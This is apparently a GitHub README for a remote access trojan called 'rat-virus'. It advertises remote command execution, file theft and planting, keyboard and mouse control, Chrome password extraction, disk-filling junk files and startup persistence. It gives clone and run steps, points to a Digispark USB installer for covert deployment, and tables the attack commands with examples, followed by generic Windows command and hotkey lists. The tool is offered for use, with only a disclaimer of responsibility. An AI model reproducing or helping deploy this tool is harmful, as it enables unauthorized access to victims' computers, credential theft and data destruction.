# RAT VIRUS

```
   _____  ____  _____  ______ _   _    _____ _    _          __  __ _      ____  _    _ 
  / ____|/ __ \|  __ \|  ____| \ | |  / ____| |  | |   /\   |  \/  | |    / __ \| |  | |
 | (___ | |  | | |__) | |__  |  \| | | (___ | |__| |  /  \  | \  / | |   | |  | | |  | |
  \___ \| |  | |  _  /|  __| | . ` |  \___ \|  __  | / /\ \ | |\/| | |   | |  | | |  | |
  ____) | |__| | | \ \| |____| |\  |  ____) | |  | |/ ____ \| |  | | |___| |__| | |__| |
 |_____/ \____/|_|  \_\______|_| \_| |_____/|_|  |_/_/    \_\_|  |_|______\____/ \____/ 
```

Powerful virus that comes with a tool will take you to the target system and you will gain access to all system resources.
Its capabilities include:

1- Executing cmd commands on the target system

2- Receiving files from the target system

3- Placing files on the target system

4- Controlling the target system's keyboard

5- Controlling the target system's mouse

6- A malicious tool for producing large files

7- The virus runs automatically after the system is turned on.

8- ...

These are not all the capabilities of this virus and the virus is updated daily.


⚠️**The use of this virus is the responsibility of the individual, not the programmer.**

![poster](https://github.com/soren2007/rat-virus/blob/master/images/image.jpg?raw=true)

## INSTALLATION

### 1. Clone the repository

```bash
git clone https://github.com/Soren2007/rat-virus.git
```

### 2. Read 'DIGISPARK-RAT-INSTALLER' repository
You can use digispark to install a malicious file on the system. Target it to the system and drop it in the startup location so that the malware runs every time the system is turned on.

To install malware using digispak, you can read and use the link below.
[DIGISPARK-RAT-INSTALLER.git](https://github.com/Soren2007/digispark-rat-installer) 

### 3. Run 'server.py' file

```bash
python server.py
```
When you run this file, it waits for a connection to the target system. Once connected, you can run commands.

### 4. Run 'client.py' file ro connect digispark usb


```bash
python client.py
```
If you ran it on the target system using digispark, you don't need to run this file. If not, you will need to run this file manually.

## COMMANDS

|    Row     |   Commad    | Description | Example |
|    :---:   |    :---:    |    :---:    |    :---:    |
|      1     |     cmd!command     | Run cmd commad | cmd!ipconfig |
|      2     |     gf!file_path     | Download and save the file | gf!C:\Users\uname\Desktop\file.pdf |
|      3     |     hk!keyname1+keyname2     | Press key or hotkey | hk!win+a |
|      4     |     cpe!get     | Get chrome passwords | cpe!get |
|      5     |     gwun!get     | Get windows username | gwun!get |
|      6     |     lfv!file_path|size_mg     | Create large file  | lfv!C:\Users|10000 |
|      7     |     sf!file_path     | Send file  | sf!C:\Users\uname\Desktop\file.pdf |


### 1. CMD
Using the cmd!command command, you can run all cmd commands on the target system and get their output.

#### Example
```
cmd!ipconfig
```

![](https://github.com/Soren2007/rat-virus/blob/master/gifs/cmd_command.gif)


#### Command Prompt Commands List:
|    Row     |   Commad    | Description |
|    :---:   |    :---:    |    :---:    |
|      1     |     Append    | The append command can be used by programs to open files in another directory as if they were located in the current directory. The append command is available in MS-DOS as well as in all 32-bit versions of Windows. The append command is not available in 64-bit versions of Windows. |
|      2     |    Arp     | 	The arp command is used to display or change entries in the ARP cache. The arp command is available in all versions of Windows. |
|      3     |    Assoc     | 	The assoc command is used to display or change the file type associated with a particular file extension. The assoc command is available in Windows 11, Windows 10, Windows 8, Windows 7, Windows Vista, and Windows XP. |
|      4     |    At     | 	The at command is used to schedule commands and other programs to run at a specific date and time. The at command is available in Windows 7, Windows Vista, and Windows XP. Beginning in Windows 8, command line task scheduling should instead be completed with the schtasks command. |
|      5     |    Atmadm     | The atmadm command is used to display information related to asynchronous transfer mode (ATM) connections on the system. The atmadm command is available in Windows XP. Support for ATM was removed beginning in Windows Vista, making the atmadm command unnecessar |
|      6     |     Attrib    | 	The attrib command is used to change the attributes of a single file or a directory. The attrib command is available in all versions of Windows, as well as in MS-DOS. |
|      7     |     Auditpol    | 	The bcdboot command is used to copy boot files to the system partition and to create a new system BCD store. The bcdboot command is available in Windows 11, Windows 10, Windows 8, and Windows 7. |
|      8     |     Bcdboot    | The bcdboot command is used to copy boot files to the system partition and to create a new system BCD store. The bcdboot command is available in Windows 11, Windows 10, Windows 8, and Windows 7. |
|      9     |     Bcdedit    | 	The bcdedit command is used to view or make changes to Boot Configuration Data. The bcdedit command is available in Windows 11, Windows 10, Windows 8, Windows 7, and Windows Vista. The bcdedit command replaced the bootcfg command beginning in Windows Vista. |
|      10     |    Bdehdcfg     | The bdehdcfg command is used to prepare a hard drive for BitLocker Drive Encryption. The bdehdcfg command is available in Windows 11, Windows 10, Windows 8, and Windows 7. |
|      11     |    Bitsadmin     | The bitsadmin command is used to create, manage, and monitor download and upload jobs. The bitsadmin command is available in Windows 11, Windows 10, Windows 8, Windows 7, and Windows Vista. While the bitsadmin command is available in those versions of Windows, it is being phased out—the BITS PowerShell cmdlets should be used instead. |
|      12     |    Bootcfg     | The bootcfg command is used to build, modify, or view the contents of the boot.ini file, a hidden file that is used to identify in what folder, on which partition, and on which hard drive Windows is located. The bootcfg command is available in Windows 10, Windows 8, Windows 7, Windows Vista, and Windows XP. The bootcfg command was replaced by the bcdedit command beginning in Windows Vista. Bootcfg is still available in Windows 10, 8, 7, and Vista, but it serves no real value since boot.ini is not used in these operating systems. |
|      13     |    Bootsect     | The bootsect command is used to configure the master boot code to one compatible with BOOTMGR (Vista and later) or NTLDR (XP and earlier). The bootsect command is available in Windows 11, Windows 10, and Windows 8. The bootsect command is also available in Windows 7 and Windows Vista but only from the Command Prompt available in System Recovery Options. |
|      14     |    Break     | The break command sets or clears extended CTRL+C checking on DOS systems. The break command is available in all versions of Windows, as well as in MS-DOS. The break command is available in Windows XP and later versions of Windows to provide compatibility with MS-DOS files but it has no effect in Windows itself. |
|      15     |    Cacls     | The cacls command is used to display or change access control lists of files. The cacls command is available in Windows 11, Windows 10, Windows 8, Windows 7, Windows Vista, and Windows XP. The cacls command is being phased out in favor of the icacls command, which should be used instead in all versions of Windows after Windows XP. |
|      16     |    Call     | The call command is used to run a script or batch program from within another script or batch program. The call command is available in all versions of Windows, as well as in MS-DOS. The call command has no effect outside of a script or batch file. In other words, running the call command at the Command Prompt or MS-DOS prompt will do nothing. |
|      17     |    Cd     | The cd command is the shorthand version of the chdir command. The cd command is available in all versions of Windows, as well as in MS-DOS |
|      18    |    Certreq     | The certreq command is used to perform various certification authority (CA) certificate functions. The certreq command is available in Windows 11, Windows 10, Windows 8, Windows 7, and Windows Vista. |
|      19     |    Certutil     | The certutil command is used to dump and display certification authority (CA) configuration information in addition to other CA functions. The certutil command is available in Windows 11, Windows 10, Windows 8, Windows 7, and Windows Vista. |
|      20     |    Change     | The change command changes various terminal server settings like install modes, COM port mappings, and logons. The change command is available in Windows 11, Windows 10, Windows 8, Windows 7, and Windows Vista. |


### 2. GET FILE
Using the gf!file_path command, you can download a file from the target system and save it to the specified path.

#### Example:
```
gf!C:\Users\Soren\Desktop\1963299127-132682296-1.mp4
```
![](https://github.com/Soren2007/rat-virus/blob/master/gifs/save_file.gif)

### 3. HOTKEY
This command will help you execute any key or hotkey you want on the target system.

#### Example:
```
hk!win+printscreen
```

![](https://github.com/Soren2007/rat-virus/blob/master/gifs/hotkey.gif)


#### Hotkeys List:

|    Row     |   Hotkey    | Description |
|    :---:   |    :---:    |    :---:    |
|      1     |    Ctrl + A     |    Select all content. |
|      2     |    Ctrl + C (or Ctrl + Insert)    |  Copy selected items to clipboard.   |
|      3     |    Ctrl + X    |  	Cut selected items to clipboard   |
|      4     |   Ctrl + V (or Shift + Insert)     |  Paste content from clipboard.   |
|      5     |    Ctrl + Z   |   Undo an action, including undelete files (limited).  |
|      6     |    Ctrl + Y    |   	Redo an action.  |
|      7     |    Ctrl + Shift + N    |   Create new folder on desktop or File Explorer.  |
|      8     |   Alt + F4     |  	Close active window. (If no active window is present, a shutdown box appears.)   |
|      9     |   Ctrl + D (Del)     |  Delete selected item to the Recycle Bin.   |
|      10     |   Shift + Delete     |  Delete the selected item permanently, skipping Recycle Bin.   |
|      11     |   F2     |  Rename selected item   |
|      12     |    Esc    |  Close current task.   |
|      13     |    Alt + Tab    |  Switch between open apps.   |
|      14     |    PrtScn    |  	Take a screenshot and stores it in the clipboard.   |
|      15     |    Windows key + I    |   Open Settings app.  |
|      16     |   Windows key + E     |  Open File Explorer   |
|      17     |   Windows key + A     |  Open Action center.   |
|      18     |   Windows key + D     |  Display and hide the desktop.   |
|      19     |   Windows key + L     |   Lock device.  |
|      20     |   Windows key + Period (.) or Semicolon (;)    |  Open emoji panel.   |
|      21     |   Windows key + PrtScn    |  Capture a full screenshot in the "Screenshots" folder.   |
|      22     |   Windows key + Shift + S    |  Capture part of the screen with Snip & Sketch.   |
|      23     |   Windows key + Left arrow key    |  Snap app or window left.   |
|      24     |   Windows key + Right arrow key    |  Snap app or window right.   |
|      25     |   Ctrl + F5 (or Ctrl + R)    |  Refresh current window.   |
|      26     |   Alt + Spacebar   |  Open context menu for the active window.   |



## EXAMPLES
